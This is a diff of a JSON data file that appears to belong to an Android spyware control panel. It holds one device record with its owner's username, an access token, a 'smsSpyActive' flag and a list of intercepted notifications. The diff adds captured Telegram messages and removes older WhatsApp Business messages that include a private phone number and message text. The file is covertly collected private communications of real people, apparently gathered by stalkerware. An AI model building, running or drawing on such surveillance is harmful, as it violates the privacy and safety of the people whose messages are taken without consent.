@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636540134,
+    "lastSeen": 1775636552094,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Ss bukti TF nya",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636554957
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636554826
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636541354
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636541341
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636541321
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636541313
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:22",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636541207
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4270,62 +4326,6 @@
         "time": "08/04 14:27",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633271875
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎157 pesan dari 4 chat",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633270595
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633270495
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎156 pesan dari 4 chat",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633267515
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633267299
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎155 pesan dari 4 chat",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633266112
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633266024
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:27",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633263699
       }
     ],
     "galleryPhotos": [],
